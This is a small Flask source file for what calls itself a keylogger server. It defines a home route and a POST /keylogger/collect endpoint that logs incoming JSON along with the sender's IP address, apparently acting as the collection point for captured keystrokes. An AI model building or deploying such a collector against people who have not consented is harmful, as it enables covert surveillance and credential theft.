from flask import Blueprint, request

from server import log_controller
from utils.http_utils import get_ip_addr

keylogger_bp = Blueprint("keylogger", __name__, url_prefix="/keylogger")
home_bp = Blueprint("home", __name__)


@home_bp.route('/')
def home():
    return "Hello, its Keylogger!"


@keylogger_bp.route('/collect', methods=['Post'])
def keylogger_collect():
    ip = get_ip_addr(request)
    return log_controller.add_log(request.get_json(), ip)